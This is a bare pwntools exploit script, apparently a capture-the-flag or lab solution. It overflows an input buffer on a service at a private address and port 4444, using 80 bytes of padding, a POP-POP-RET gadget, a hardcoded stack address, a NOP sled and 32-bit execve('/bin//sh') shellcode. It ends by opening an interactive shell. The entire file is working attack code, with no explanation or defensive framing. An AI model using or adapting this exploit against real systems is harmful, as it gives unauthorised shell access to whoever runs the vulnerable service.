from pwn import *

off = 80

pad = 'A' * off

buf = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69'
buf += '\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = p32(0x08048452)  # POP, POP, RET gadget

ret += 'AAAA'          # POP
ret += 'AAAA'          # POP
ret += p32(0xbffff820) # RET

payload = pad + ret + nop + buf

r = remote('192.168.122.87', 4444)
r.recvuntil('input path please: ')
r.sendline(payload)
r.interactive()
